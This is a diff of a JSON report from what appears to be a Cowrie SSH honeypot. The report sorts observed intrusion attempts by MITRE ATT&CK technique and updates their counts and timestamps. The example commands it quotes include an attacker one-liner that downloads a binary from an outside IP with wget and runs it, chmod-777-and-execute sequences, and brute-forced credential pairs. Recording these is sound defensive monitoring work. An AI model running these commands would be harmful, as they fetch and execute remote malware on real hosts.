@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-18 04:00:21",
+  "generated": "2026-09-18 05:00:44",
   "totals": {
-    "commands": 45,
-    "login_failed": 105,
-    "login_success": 8,
-    "sessions": 118
+    "commands": 50,
+    "login_failed": 201,
+    "login_success": 15,
+    "sessions": 229
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 105,
+      "count": 201,
       "examples": [
         "admin / user",
         "root / 123456",
@@ -21,14 +21,14 @@
         "admin / fuckfest"
       ],
       "first": "2026-09-18T00:03:59.596268Z",
-      "last": "2026-09-18T03:57:28.745390Z",
-      "unique_ips": 21
+      "last": "2026-09-18T04:59:36.953595Z",
+      "unique_ips": 30
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 16,
+      "count": 17,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-18T01:58:57.968693Z",
-      "last": "2026-09-18T03:19:54.207938Z",
-      "unique_ips": 2
+      "last": "2026-09-18T04:18:53.181296Z",
+      "unique_ips": 3
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 8,
+      "count": 15,
       "examples": [
         "ubuntu / ubuntu",
         "adm / adm",
@@ -53,22 +53,37 @@
         "root / admin"
       ],
       "first": "2026-09-18T00:24:48.056231Z",
-      "last": "2026-09-18T03:29:33.346274Z",
-      "unique_ips": 8
+      "last": "2026-09-18T04:45:09.456376Z",
+      "unique_ips": 15
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 10,
       "examples": [
         "uname -a",
         "cat /proc/cpuinfo",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "uname -s -v -n -r -m",
+        "uname -s -m"
       ],
       "first": "2026-09-18T00:25:00.479830Z",
-      "last": "2026-09-18T03:29:45.771219Z",
-      "unique_ips": 4
+      "last": "2026-09-18T04:24:22.633922Z",
+      "unique_ips": 7
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-09-18T01:58:59.591466Z",
+      "last": "2026-09-18T04:18:53.181296Z",
+      "unique_ips": 3
     },
     {
       "id": "T1105",
@@ -85,19 +100,6 @@
       "unique_ips": 1
     },
     {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T03:19:54.207938Z",
-      "unique_ips": 2
-    },
-    {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
@@ -111,6 +113,30 @@
       "unique_ips": 1
     },
     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 2,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-09-18T03:19:54.207938Z",
+      "last": "2026-09-18T04:18:53.181296Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-09-18T03:19:54.207938Z",
+      "last": "2026-09-18T04:18:53.181296Z",
+      "unique_ips": 2
+    },
+    {
       "id": "T1016",
       "name": "System Network Configuration Discovery",
       "tactic": "Discovery",
@@ -120,30 +146,6 @@
       ],
       "first": "2026-09-18T02:28:03.535500Z",
       "last": "2026-09-18T02:28:03.535500Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 1,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-09-18T03:19:54.207938Z",
-      "last": "2026-09-18T03:19:54.207938Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 1,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-09-18T03:19:54.207938Z",
-      "last": "2026-09-18T03:19:54.207938Z",
       "unique_ips": 1
     },
     {
@@ -210,6 +212,14 @@
     ],
     [
       "echo Hi | cat -n",
+      1
+    ],
+    [
+      "Accept-Encoding: gzip",
+      1
+    ],
+    [
+      "echo SHELL_TEST",
       1
     ]
   ]
